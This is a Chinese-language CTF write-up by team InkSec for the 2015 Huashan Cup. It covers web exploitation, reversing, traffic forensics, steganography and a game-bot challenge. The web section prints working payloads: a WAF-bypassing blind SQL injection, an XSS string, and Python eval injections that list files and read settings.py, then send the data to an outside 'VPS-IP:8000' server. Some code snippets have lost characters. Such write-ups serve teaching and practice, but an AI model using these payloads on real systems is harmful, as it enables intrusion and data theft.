# 2015华山杯#WriteUp

阅读量 **188660**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2015-11-02 15:00:12

 **x**

##### 译文声明

本文是翻译文章，文章来源：InkSec@360安全播报

译文仅供参考，具体内容表达以及含义原文为准。

网络安全技能大赛  

解题报告

队伍: InkSec

时间: 2015-11-02

**Web渗透**

1.怎么在Web上Ping呢(100pt,麦香浓郁)

刚开始用尽各种姿势都没搞定。后来在度娘上搜html ping发现了这篇文章:

[http://netsecurity.51cto.com/art/201508/487806.htm](http://netsecurity.51cto.com/art/201508/487806.htm)

之后本地构造了一个页面 在a标签里加ping

之后抓包。。用进各种姿势都只能抓到get包。。最后发现是火狐不支持这个属性改用chrome,之后再重放包得到flag

2.社工库查询(150pt,麦香浓郁)

这道题真的有点坑啊.
刚开始提示西瓜大神的信息,然后就去搜西瓜皮的qq,然后再搜别的四叶草大牛的qq,最后发现都没用.后来随意搜了下10000(腾讯官方帐号)

发现得到如下提示:

提示intval

再尝试10000.xxx 就得到flag

Flag{psq6BvdveCvrdpxKq8if9B2XSIOGzbii}

3.Access注入(200pt,麦香浓郁)

这道题主要考查Access偏移注入 做出来的队伍很多

先猜表的长度最后构造查询语句

FLAG:469e80d32c0559f8

4.有WAF该怎么注入呢(300pt,[麦香浓郁,小数点])

Waf绕过总结之后医生师傅构造了payload给我

id=1%20%26%26%20ORD(substr((select%60flag%60from%60flag%60),2,1))=107

之后用脚本跑,

得到:

(106,107,115,99,104,118,107,106,97,115,109,122,110,120,118,107,106,97,104,115,100,97,115,100,120,122,99,113,119,101)

再将ascii码转换为字母就是flag

5.XSS???XSS!!!(400pt,小墨)

参考乌云知识库的一篇文章:
[http://drops.wooyun.org/papers/938](http://drops.wooyun.org/papers/938)

基本上是一样的,直接构造最水的那个payload

[http://218.245.4.113:8080/web05/df1014aa2d59e1a02bba52955f797c7d/xss.php?xss=YWxlcnQoMSkK%22Oncut%3DsetInterval%28atob(value)%29%2c%26quot](http://218.245.4.113:8080/web05/df1014aa2d59e1a02bba52955f797c7d/xss.php?xss=YWxlcnQoMSkK%22Oncut%3DsetInterval%28atob\(value\)%29%2c%26quot)

value里是alert(1)的base64编码后的值,

Oncut首字母大写,绕过on的过滤

然后用setInterval定时执行value的base64解码之后的值

最后闭合后面的双引号

6.Python-Web(500pt,小墨)

通过burp修改obj,和method发包测试,

根据报错拼出部分核心代码为:

    
    
    c = json.loads(request.body)
     method = getattr(globals()[c['obj']],c['method'])
     ret = method(c['params'])
     retdata['result'],retdata['error'] = ret

第一行将请求的json解析

第二行method = getattr(globals()[请求的obj],请求的method)

第三行是将上一行的method作为函数,请求的params作为参数并将执行结果返回给ret

第四行不用解释了..

经过测试,可用的obj分别是:

    
    
    globals()['__package__']  ==> str
    globals()['__builtin__']  ==> module
    globals()['__builtins__'] ==> dict

继续测试globals()['__builtin__']里有哪些可用的method,

发现至少eval和open是可用的

有这两个就够了,记得乌云知识库有一篇文章就是专门写python的eval安全问题的,然后构造获取当前目录的payload:

    
    
    {"obj":"__builtin__","method":"eval","params":"__import__('urllib2').urlopen('http://VPS-IP:8000/',str.join(',',__import__('os').listdir('./')).encode('base64').replace('\n',''))"}

将当前目录下的文件/子目录列表base64编码后发送到vps的8000端口

接收并解码后知道有mysite,config.yaml,manage.py,static,app,index.wsgi 这些文件/目录,

然后继续获取mysite目录下的东西

可以看到有一个settings.py

然后构造读文件的payload读取./mysite/settings.py

{"obj":"__builtin__","method":"eval","params":"__import__('urllib2').urlopen('http://VPS-IP:8000/',open('./mysite/settings.py').read().encode('base64').replace('\n',''))"}

解码后即可获得Flag

flag{31e262014a402b9f7d2dc9970cf39ca5}

**  
**

**逆向破解**

1.逆向破解-1(100pt,小墨)

载入OD,搜索字符串,在那几个看起来像base64的字符串上下断点

在附近找cmp,并在cmp上下断点

运行,随便输入密码,点确定,断下后单步执行,

在4016d2位置上有一个长度比较,所以密码长度必须为0x13(19)

继续运行,输入一串长度为19的字符串点确定,断下后单步执行

执行到401747的时候在堆栈里能看到"HOWMP半块西瓜皮hehe"

数了一下正好是19位,猜测这个就是密码

继续运行程序输入"HOWMP半块西瓜皮hehe",flag就出来了

(论二进制是怎样虐Web狗的之一)

2.逆向破解-2(200pt,小墨)

这是个golang的程序,先把程序upx脱壳,运行后显示:

游戏分两关,第一关

在浏览器中打开地址,在js

sum ^= 9981;

下断点

输入用户名密码提交,断下后按一下单步,记下sum的值

下面的if是判断sum和sum2是否相等

而sum2等于输入的密码的倒序

所以密码输入sum的倒序就可以这里的sum是9309,所以密码输入9039提交就可以进入第二关.

第二关:

在js中看到将用户名和密码GET提交到/crackme2的位置

用x64_dbg附加游戏进程

跑了几圈,在401000附近看到crackme2字样

下断点跟踪,跟到4012dc位置时看到了一串数字

猜测这个就是密码,提交后看到

{"Code":1,"Info":"4619176"}

目测是过关了..

(论二进制是怎样虐Web狗的之二)

3.逆向破解-3(300pt,麦香浓郁)

题目中有一个9*9的矩阵,如下:

01 01 00 01 01 01 00 01 01

01 00 00 00 00 00 00 00 01

01 00 00 00 00 12 22 00 01

01 32 00 00 00 42 00 00 01

00 00 00 00 00 00 00 00 00

01 00 00 52 00 00 00 00 01

00 00 00 00 00 00 62 00 00

01 72 00 00 82 00 00 00 01

01 01 00 01 01 01 01 00 01

输入的字符串每2个字符为一组,记为ab。a表示移动数a2,b表示移动方向(1234对应左右上下)

最终目的,在矩阵中间有8个*2的数,需要将其移动到边上的00位置处。

不知道怎么写算法,就手动构造了。

513441112163233144428184545114127274

为了方便调试,写了个脚本,查看每次移动后的矩阵情况。

    
    
    from pydbg import *
    from pydbg.defines import *
    def handler1(dbg):
        d = dbg.read(0x00407030, 81)
    print '##########'
    for i in range(9):
    for j in range(9):
    print str(ord(d[i*9+j])).rjust(2, '0'),
    print
    return DBG_CONTINUE
    def main():
        dbg = pydbg()
        dbg.load('./toetrix_crackme.exe', create_new_console=True)
        dbg.bp_set(0x40125b, handler=handler1)
        dbg.run()
    main()

**网络取证**

1.流量分析1(150pt,小墨)

wireshark打开流量包,按照协议排序,然后按住方向键下键往下滚..

滚到ICMP协议的时候发现ICMP的数据段有一位竟然在变..

正常ping的数据包虽然不同系统不一样,但是也不至于就变一位,还是每次都不一样

仔细看看之后发现这些数据段的头一位拼接起来就是flag

(flag没保存..我就不再拼一遍了..)

2.扫雷(250pt,小墨)

google搜索"在线分析dmp文件"找到一个网站

把dmp文件上传上去..等分析完毕后在Strings里就能看到flag:

(Orz..开始的时候还把dmp里的扫雷程序提取出来玩了一会儿..结果….)

3.流量分析2(400pt,小墨)

wireshark打开流量包,按照协议排序,看看都有什么协议的数据包

向下拉,看到有FTP和FTP-DATA

FTP-DATA里是一个rar压缩文件

提取出来之后发现里面的文件需要解压密码

设置筛选器为:frame contains pass碰碰运气..结果还真碰到了..

跟随数据流可以看到一段Base64

解码后写入文件:

然后用Notepad++打开调整编码为ASCII可以看到一句话:

一枝红杏出墙来

这个就是压缩包密码,解压出来一个文件

打开后发现IHDR,目测应该是个png图片,只不过文件头被删了

用010editor修复文件头

打开之后就能看到flag

3.Hack-Team(500pt,麦香浓郁)

这道题有500分….

拿diskgenius当虚拟硬盘修复一下,能得到两个文件

一个tips.txt 一个000000.pdf

tips里的古诗拼音就是pdf的密码 打开就可以得到flag

最关键的是 win下打不开 os x下可以。。

Flag{f6fdffe48c908deb0f4c3bd36c032e72}

**  
**

**密码 &算法**

2.图片隐写(200pt,小墨)

用010editor打开

看到一个像Rar文件头的地方,修复并提取:

打开后可以看到有一个2.jpg和一堆目录

把2.jpg放进010editor可以看到一段base64

5Zub5Y+26I2J5a6J5YWo

解码后是"四叶草安全"也就是压缩包密码

把压缩包里那些目录提取出来之后发现一共有6层目录名都是0,1,每个最底层的目录里都有一个文件文件名是随机的,文件内容是一串37位的二进制

先不管这串二进制是啥,先写个脚本把文件内容提取出来

然后按照000000-111111的顺序排序

pic1.py:

    
    
    #-*- coding: UTF-8 -*-    __author__ = 'wabzsy'
    import os
    def catFile(filepath):
       pathDir =  os.listdir(filepath)
       for allDir in pathDir:
          child = os.path.join('%s%s' % (filepath, allDir))
          print open(child).read().replace('1','  ').replace('0','MM')
    if __name__ == '__main__':
       filePath = "./"
       for a in range(0,2):
          for b in range(0,2):
             for c in range(0,2):
                for d in range(0,2):
                   for e in range(0,2):
                      for f in range(0,2):
                         catFile(filePath+"/"+str(a)+"/"+str(b)+"/"+str(c)+"/"+str(d)+"/"+str(e)+"/"+str(f)+"/")

运行:

看起来像段二维码..

修改脚本将

    
    
    print open(child).read()

改成

    
    
    print open(child).read().replace('1','  ').replace('0','MM')

再执行,并截图:

直接微信二维码扫上图即可得到flag

3.图片隐写2(300pt,麦香浓郁)

这道,刚开始检测一下是jphide 隐写 然后就去看口令,以为是数字代替字母,转换完成之后去做词频密码解密还是不行

最后丢到winhex里

发现有个tiff 把之前的jpg数据删掉 然后用ps打开 发现有很多图层

再根据口令,找图层中的字母 得到flag

4.魔塔AI编写(500pt,bibi)[赛后完成,未得分]

这个题目其实很简单,坑点是我开始误以为层数太多了.

首先几个基本策略是,打得过就打,打不过就跑,多层Flood Fill.

具体实施是获取所有的道具,进入下一层,直到能够杀死所有的princess.

开始是将princess当成墙来看.

然后我以为111111层 结果======

ssctf_ai.py

    
    
    from zio import *
     import Image
     import time
     io = zio(("127.0.0.1", 22031))
     cur_atk = 10
     cur_def = 10
     cur_hp = 1000
     cur_floor = 0
     cur_x = 0
     cur_y = 0
     mon_floor = -1
     upstairs = []
     downstairs = [None]
     floors = []
     
     princesses = {ord('a') : [80, 60, 1000], ord('b') : [200, 150, 1000], ord('c') : [300, 150, 1000], ord('d') : [300, 250, 3000]}
     princess_floor = {ord('a') : -1, ord('b') : -1, ord('c') : -1, ord('d') : -1}
     
     def beat_princess(hp, p):
         att = princesses[p]
         prin_atk, prin_def, prin_hp = att
         if cur_atk <= prin_def:
             return 0
         battle_rounds = prin_hp / (cur_atk - prin_def)
         if prin_hp % (cur_atk - prin_def) != 0:
             battle_rounds += 1
         if prin_atk > cur_def:
             hp -= (battle_rounds - 1) * (prin_atk - cur_def)
         else:
             hp -= 0
         return hp
     
     def can_beat_all_princesses():
         new_hp = cur_hp
         for p in princesses.keys():
             new_hp = beat_princess(cur_hp, p)
             if new_hp <= 0:
                 return False
         return None
     
     def from_text_to_maze(r):
         r = r.strip().split("n")
         r = map(lambda x : x.split("|")[0], r)
         w = len(r[0])
         h = len(r)
         colormode = 'L'
         bgcolor = (0)
         size = (w, h)
         image = Image.new(colormode, size, bgcolor)
         maze = image.load()
         for i in xrange(h):
             for j in xrange(w):
                 maze[j, i] = ord(r[i][j])
         return image
     
     def add_new_floor(r):
         global cur_x
         global cur_y
         image = from_text_to_maze(r)
         maze = image.load()
     
         if cur_floor == len(floors):
             (w, h) = image.size
             for i in xrange(h):
                 for j in xrange(w):
                     if maze[j, i] == ord('/'):
                         upstairs.append((i, j))
                     if maze[j, i] == ord('X'):
                         cur_x = i
                         cur_y = j
                         if cur_floor == 0:
                             maze[j, i] = ord('.')
                         else:
                             maze[j, i] = ord('\')
                             downstairs.append((i, j))
                     if maze[j, i] == ord('Y'):
                         mon_floor = len(floors)
                     if ord('a') <= maze[j, i] <= ord('d'):
                         princess_floor[maze[j, i]] = cur_floor
             floors.append(image)
     
     GO_UP = 1
     GO_DOWN = 2
     GO_THROUGH = 3
     GO_PRINCESS = 4
     
     go_dict = {1 : "GO_UP", 2 : "GO_DOWN", 3 : "GO_THROUGH", 4 : "GO_PRINCESS"}
     
     import pdb
     def goto_dest(dest):
         global cur_floor
         global cur_atk
         global cur_def
         global cur_hp
         global cur_x
         global cur_y
     
         f = floors[cur_floor]
         pixels = f.load()
         seq, cur_x, cur_y = dest
         io.write(seq + "n")
         r = io.read_nonblocking(4096)
         if pixels[cur_y, cur_x] in map(ord, list('/')):
             cur_floor += 1
             add_new_floor(r)
             cur_x, cur_y = downstairs[cur_floor]
             return
         if pixels[cur_y, cur_x] in map(ord, list('\')):
             cur_floor -= 1
             cur_x, cur_y = upstairs[cur_floor]
             return
         if pixels[cur_y, cur_x] in map(ord, list('/')):
             cur_floor += 1
             cur_x, cur_y = downstairs[cur_floor]
             return
         if pixels[cur_y, cur_x] in map(ord, list('ADP')):
             if pixels[cur_y, cur_x] == ord('A'):
                 cur_atk += 5
             if pixels[cur_y, cur_x] == ord('D'):
                 cur_def += 5
             if pixels[cur_y, cur_x] == ord('P'):
                 cur_hp += 500
             pixels[cur_y, cur_x] = ord('.')
         if pixels[cur_y, cur_x] in map(ord, list('abcd')):
             cur_hp = beat_princess(cur_hp, pixels[cur_y, cur_x])
             del princesses[pixels[cur_y, cur_x]]
             pixels[cur_y, cur_x] = ord('.')
     
     import Queue
     import copy
     directions = [
         ['h', 0, -1],
         ['j', 1, 0],
         ['k', -1, 0],
         ['l', 0, 1],
     ]
     def find_next_dest(go_type):
         f = floors[cur_floor]
         w, h = f.size
         colormode = 'L'
         size = (w, h)
         bgcolor = (0)
         count_map = Image.new(colormode, size, bgcolor).load()
         count_map[cur_y, cur_x] = 0
         q = Queue.Queue()
         q.put(["", cur_x, cur_y])
         pixels = f.load()
         while not q.empty():
             seq, x, y = q.get()
             for d in directions:
                 s, dx, dy = d
                 new_seq = copy.copy(seq) + copy.copy(s)
                 new_x = x + dx
                 new_y = y + dy
                 if count_map[new_y, new_x] > 0:
                     continue
                 if pixels[new_y, new_x] in map(ord, list('#')):
                     continue
                 if pixels[new_y, new_x] in map(ord, list('abcd')):
                     if go_type == GO_PRINCESS:
                         return [new_seq, new_x, new_y]
                     princess_floor[pixels[new_y, new_x]] = cur_floor
                     continue
                 count_map[new_y, new_x] = count_map[y, x] + 1
                 if pixels[new_y, new_x] in map(ord, list('/')):
                     up_x, up_y = upstairs[cur_floor]
                     if go_type == GO_UP:
                         return [new_seq, up_x, up_y]
                     if cur_floor == len(floors) - 1:
                         goto_dest([new_seq, up_x, up_y])
                         back = find_next_dest(GO_DOWN)
                         goto_dest(back)
                         dest = find_next_dest(go_type)
                         return dest
                     else:
                         for i, d2 in enumerate(directions):
                             s, dx, dy = d2
                             up_pixels = floors[cur_floor + 1].load()
                             down_x, down_y = downstairs[cur_floor + 1]
                             if up_pixels[down_y + dy, down_x + dx] in map(ord, list('.')):
                                 new_seq += s
                                 new_seq += directions[3 - i][0]
                                 break
                     q.put([new_seq, new_x, new_y])
                     continue
                 if pixels[new_y, new_x] in map(ord, list('\')):
                     down_x, down_y = downstairs[cur_floor]
                     if go_type == GO_DOWN:
                         return [new_seq, down_x, down_y]
                     for i, d2 in enumerate(directions):
                         s, dx, dy = d2
                         down_pixels = floors[cur_floor - 1].load()
                         up_x, up_y = upstairs[cur_floor - 1]
                         if down_pixels[up_y + dy, up_x + dx] in map(ord, list('.')):
                             new_seq += s
                             new_seq += directions[3 - i][0]
                             break
                     q.put([new_seq, new_x, new_y])
                     continue
                 if pixels[new_y, new_x] in map(ord, list('Y')):
                     return [new_seq, new_x, new_y]
                 if pixels[new_y, new_x] in map(ord, list('ADP')):
                     return [new_seq, new_x, new_y]
                 if pixels[new_y, new_x] in map(ord, list('.')):
                     q.put([new_seq, new_x, new_y])
         return None
     
     def run():
         io.write("OKn")
         r = io.read_nonblocking(4096)
         add_new_floor(r)
         r = io.read_nonblocking(4096)
         add_new_floor(r)
         while True:
             dest = find_next_dest(GO_THROUGH)
             if dest != None:
                 goto_dest(dest)
             else:
                 dest = find_next_dest(GO_UP)
                 if dest == None:
                     dest = find_next_dest(GO_PRINCESS)
                     if dest == None:
                         break
                 goto_dest(dest)
             time.sleep(1)
             if can_beat_all_princesses():
                 break
         while cur_floor != 0:
             dest = find_next_dest(GO_DOWN)
             goto_dest(dest)
         dest = find_next_dest(GO_PRINCESS)
         goto_dest(dest)
         dest = find_next_dest(GO_THROUGH)
         goto_dest(dest)
         r = io.read_nonblocking(4096)
         r = io.read_nonblocking(4096)
         r = io.read_nonblocking(4096)
         r = io.read_nonblocking(4096)
     run()

这题虽然是赛后解出来的,但是也发出来吧→_→

本文翻译自InkSec@360安全播报 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **安全客** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/82831](/post/id/82831)

安全客 - 有思想的安全新媒体

本文转载自: [InkSec@360安全播报]()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF通关攻略](/tag/CTF通关攻略)

 **+1** __0赞

 __收藏

![](https://p0.ssl.qhimg.com/t01546a096e83e700fe.jpg) 安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

